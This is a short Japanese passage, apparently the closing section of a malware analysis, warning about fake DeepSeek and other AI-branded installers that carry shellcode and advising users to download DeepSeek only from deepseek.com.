AIブームに便乗したマルウェア配布キャンペーンは今後も増え続けるだろう。DeepSeek、ChatGPT、Gemini、Perplexity -- ブランド名が違うだけで中身は同じインフラだ。百度チェックと49日のSleepで武装した169MBの偽インストーラーは、中国語圏の一般ユーザーにとって十分な脅威である。

正規のDeepSeekは `deepseek.com` からしかダウンロードできない。それ以外のドメインは、マトリョーシカの中にシェルコードが入っている可能性がある。
